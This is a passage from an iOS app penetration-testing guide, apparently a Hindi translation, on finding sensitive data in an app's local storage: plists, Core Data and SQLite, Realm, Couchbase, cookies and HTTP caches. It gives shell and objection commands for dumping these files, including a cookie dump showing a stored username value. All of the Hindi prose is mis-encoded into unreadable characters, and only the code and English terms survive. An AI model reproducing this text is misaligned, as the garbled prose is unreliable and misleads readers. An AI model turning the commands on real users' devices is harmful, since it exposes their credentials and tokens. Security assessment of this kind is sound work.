**рдЗрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╕реВрдЪрдирд╛ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреА** рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж**, **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рд╕рднреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдУрдВ** рдХреА рдЬрд╛рдВрдЪ рдХреЗ рдмрд╛рдж рдФрд░ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рд▓реЙрдЧрд┐рди рдЖрдЙрдЯ рдХрд░рдиреЗ рдФрд░ рдПрдХ рдЕрд▓рдЧ рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж**ред\
рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА **рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** (рдкрд╛рд╕рд╡рд░реНрдб, рдЯреЛрдХрди), рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдкрд╣рд▓реЗ рд▓реЙрдЧ рдЗрди рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдорд┐рд▓реЗред
{% endhint %}

### Plist

**plist** рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрд░рдЪрд┐рдд XML рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬреЛ **рдХреБрдВрдЬреА-рдорд╛рдирдХ рдЬреЛрдбрд╝реЗ** рд░рдЦрддреА рд╣реИрдВред рдпрд╣ рд╕реНрдерд╛рдпреА рдбреЗрдЯрд╛ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХрднреА-рдХрднреА рдЖрдкрдХреЛ рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓ рд╕рдХрддреА рд╣реИ**ред рдпрд╣ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдФрд░ рдЗрд╕реЗ рдЕрдзрд┐рдХ рдкреНрд░рдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдирдП рдбреЗрдЯрд╛ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИред

рдкреНрд▓рд┐рд╕реНрдЯ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рдбреЗрдЯрд╛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдпреА рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ **NSUserDefaults** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рдпрд╣ рдкреНрд▓рд┐рд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЗ рдЕрдВрджрд░ **`Library/Preferences/<appBundleID>.plist`** рдореЗрдВ рд╕рд╣реЗрдЬреА рдЬрд╛рддреА рд╣реИред

[`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) рдХрдХреНрд╖рд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрд╛рд░реНрдпрдХреНрд░рдорд╛рддреНрдордХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рд┐рд╕реНрдЯрдо рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЕрдиреБрд╕рд╛рд░ рдЕрдкрдиреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рд╕рд╛рдЭрд╛рдХрд░рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред `NSUserDefaults` рджреНрд╡рд╛рд░рд╛ рд╕рд╣реЗрдЬреЗ рдЧрдП рдбреЗрдЯрд╛ рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдВрдбрд▓ рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХрдХреНрд╖рд╛ **рдкреНрд▓рд┐рд╕реНрдЯ** **рдлрд╝рд╛рдЗрд▓** рдореЗрдВ **рдбреЗрдЯрд╛** рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдпреА рдХрд░рддреА рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдЫреЛрдЯреА рдорд╛рддреНрд░рд╛ рдореЗрдВ рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдЗрд╕ рдбреЗрдЯрд╛ рдХреЛ рд╕реАрдзреЗ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓рдВрдмреЗ рд╕рдордп рддрдХ рдирд╣реАрдВ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ **рдмреИрдХрдЕрдк** рдХрд░рдХреЗ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЖрдк **`NSUserDefaults`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд╣реЗрдЬреЗ рдЧрдП рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **рдбрдВрдк** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ objection рдХреЗ `ios nsuserdefaults get` рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣ред

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕рднреА рдкреНрд▓рд┐рд╕реНрдЯ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк `/private/var/mobile/Containers/Data/Application/{APPID}` рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
find ./ -name "*.plist"
```
рдлрд╝рд╛рдЗрд▓реЗрдВ **XML рдпрд╛ рдмрд╛рдЗрдирд░реА (bplist)** рдкреНрд░рд╛рд░реВрдк рд╕реЗ XML рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЗ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рдзрд┐рдпрд╛рдБ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ:

**рдореИрдХрдУрдПрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП:** `plutil` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдпрд╣ рдПрдХ рдмрд┐рд▓реНрдЯ-рдЗрди рдЯреВрд▓ рд╣реИ рдореИрдХрдУрдПрд╕ (10.2+) рдореЗрдВ, рдЬреЛ рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```bash
$ plutil -convert xml1 Info.plist
```
**рд▓рд┐рдирдХреНрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП:** рдкрд╣рд▓реЗ `libplist-utils` рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ, рдлрд┐рд░ рдЕрдкрдиреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХрдирд╡рд░реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `plistutil` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Objection рд╕рддреНрд░ рдХреЗ рднреАрддрд░:** рдореЛрдмрд╛рдЗрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрдорд╛рдВрдб рдЖрдкрдХреЛ plist рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕реАрдзреЗ рдХрдирд╡рд░реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`рдХреЛрд░ рдбреЗрдЯрд╛`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) рдЖрдкрдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдореЙрдбрд▓ рд▓реЗрдпрд░ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИред [рдХреЛрд░ рдбреЗрдЯрд╛ SQLite рдХреЛ рдЕрдкрдирд╛ рд╕реНрдерд╛рдпреА рд╕реНрдЯреЛрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), рд▓реЗрдХрд┐рди рдлреНрд░реЗрдорд╡рд░реНрдХ рдЦреБрдж рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдирд╣реАрдВ рд╣реИред\
CoreData рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдкрдиреЗ рдбреЗрдЯрд╛ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, CoreData рдореЗрдВ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рд▓реЗрдпрд░ рдЬреЛрдбрд╝реА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [GitHub Repo](https://github.com/project-imas/encrypted-core-data) рджреЗрдЦреЗрдВред

рдЖрдк рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА SQLite рдХреЛрд░ рдбреЗрдЯрд╛ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкрде `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support` рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

**рдпрджрд┐ рдЖрдк SQLite рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдиреЗ рдПрдХ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд╛рдпрд╛ рд╣реИред**

{% code title="iGoat рд╕реЗ рдХреЛрдб" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) рдПрдХ SQLite рдХреЗ рдКрдкрд░ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ key/value рд╕реНрдЯреЛрд░ рд╣реИред\
рдпрд╛рдк рдбреЗрдЯрд╛рдмреЗрд╕реЗрд╕ SQLite рдбреЗрдЯрд╛рдмреЗрд╕реЗрд╕ рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЙрдиреНрд╣реЗрдВ рдкрд┐рдЫрд▓реЗ рд╕реЗрдХреНрд╢рди рдореЗрдВ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред

### рдЕрдиреНрдп SQLite рдбреЗрдЯрд╛рдмреЗрд╕реЗрд╕

рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ SQLite рдбреЗрдЯрд╛рдмреЗрд╕ рдмрдирд╛рдирд╛ рдЖрдо рд╣реИред рд╡реЗ рдЙрдирдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛** рд╕реНрдЯреЛрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдЕрдирдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЫреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рд╣рд░ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рд╣рдореЗрд╢рд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдЬрд╛рдПрдВ рдЬрд╣рд╛рдВ рдбреЗрдЯрд╛ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Real-Time Databases

рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ Firebase Real-Time Databases рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдбреЗрдЯрд╛ рд╕реНрдЯреЛрд░ рдФрд░ рд╕рд┐рдВрдХ рдХрд░рдиреЗ** рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реИ рдЬреЛ рдХрд┐ рдПрдХ **NoSQL рдХреНрд▓рд╛рдЙрдб-рд╣реЛрд╕реНрдЯреЗрдб рдбреЗрдЯрд╛рдмреЗрд╕** рдореЗрдВ рд╣реЛрддреА рд╣реИред JSON рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдбреЗрдЯрд╛ рд╕рднреА рдХрдиреЗрдХреНрдЯреЗрдб рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ рд╕рд┐рдВрдХреНрд░рдирд╛рдЗрдЬрд╝ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдк рдпрд╣рд╛рдБ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдорд┐рд╕рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ Firebase рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm databases

[Realm Objective-C](https://realm.io/docs/objc/latest/) рдФрд░ [Realm Swift](https://realm.io/docs/swift/latest/) рдбреЗрдЯрд╛ рд╕реНрдЯреЛрд░реЗрдЬ рдХреЗ рд▓рд┐рдП рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рд╡рд┐рдХрд▓реНрдк рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ Apple рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдпреЗ рдбреЗрдЯрд╛рдмреЗрд╕ **рдбреЗрдЯрд╛ рдЕрдирдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб** рд░рдЦрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рд╢реЗрд╖ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдЙрдкрд▓рдмреНрдз рд╣реИред

рдбреЗрдЯрд╛рдмреЗрд╕ `/private/var/mobile/Containers/Data/Application/{APPID}` рдкрд░ рд╕реНрдерд┐рдд рд╣реИрдВред рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдЕрдиреНрд╡реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╡реНрдпрдХреНрддрд┐ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
рдЗрди рдбреЗрдЯрд╛рдмреЗрд╕ рдлрд╝рд╛рдЗрд▓реНрд╕ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП, [**Realm Studio**](https://github.com/realm/realm-studio) рдЯреВрд▓ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

Realm рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рд╕реНрдирд┐рдкреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite рдбреЗрдЯрд╛рдмреЗрд╕

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) рдХреЛ **рд╣рд▓реНрдХрд╛** рдФрд░ **рдПрдореНрдмреЗрдбреЗрдб** рдбреЗрдЯрд╛рдмреЗрд╕ рдЗрдВрдЬрди рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд░реНрдгрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ **рдбреЙрдХреНрдпреВрдореЗрдВрдЯ-рдУрд░рд┐рдПрдВрдЯреЗрдб** (NoSQL) рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИред **iOS** рдФрд░ **macOS** рдХреЗ рд▓рд┐рдП рдореВрд▓ рд░реВрдк рд╕реЗ рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛, рдпрд╣ рдбреЗрдЯрд╛ рдХреЛ рд╕рд┐рдВрдХ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

рдЙрдкрдХрд░рдг рдкрд░ Couchbase рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рд╕рдВрднрд╛рд╡рд┐рдд рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирд┐рд░реАрдХреНрд╖рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### рдХреБрдХреАрдЬрд╝

iOS рдПрдкреНрд╕ рдХреА рдХреБрдХреАрдЬрд╝ рдХреЛ рд╣рд░ рдПрдкреНрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ **`Library/Cookies/cookies.binarycookies`** рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдбреЗрд╡рд▓рдкрд░ рдХрднреА-рдХрднреА рдЗрдиреНрд╣реЗрдВ **рдХреАрдЪреЗрди** рдореЗрдВ рд╕реЗрд╡ рдХрд░рдиреЗ рдХрд╛ рдирд┐рд░реНрдгрдп рд▓реЗрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд **рдХреБрдХреА рдлрд╝рд╛рдЗрд▓ рдмреИрдХрдЕрдк рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдХреБрдХреАрдЬрд╝ рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдЖрдк [**рдЗрд╕ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ objection рдХрд╛ **`ios cookies get`** рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
**рдЖрдк objection рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ** рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЬреЗрд╕рди рдлрд╝реЙрд░реНрдореЗрдЯ рдореЗрдВ рдХрдирд╡рд░реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдбреЗрдЯрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### рдХреИрд╢

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ NSURLSession рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ **рдХреИрд╢ рдбреАрдмреА** рдореЗрдВ **HTTP рдЕрдиреБрд░реЛрдз рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ** рдЬреИрд╕реЗ рдбреЗрдЯрд╛ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдЯреЛрдХрди, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдпрд╛ рдХреЛрдИ рдЕрдиреНрдп рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреИрд╢ рдХреА рдЧрдИ рд╣реИ рддреЛ рдпрд╣ рдбреЗрдЯрд╛рдмреЗрд╕ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛** рднреА рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдХреИрд╢ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдРрдк рдХреЗ рдбреЗрдЯрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ (`/var/mobile/Containers/Data/Application/<UUID>`) рдЦреЛрд▓реЗрдВ рдФрд░ `/Library/Caches/<рдмрдВрдбрд▓ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛>` рдкрд░ рдЬрд╛рдПрдВред **WebKit рдХреИрд╢ рднреА рдХреИрд╢ рдбреАрдмреА** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред **Objection** рдХрдорд╛рдВрдб `sqlite connect Cache.db` рдХреЗ рд╕рд╛рде рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдЦреЛрд▓рдХрд░ рдФрд░ рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ **рд╕рд╛рдорд╛рдиреНрдп SQLite рдбреЗрдЯрд╛рдмреЗрд╕** рд╣реИред

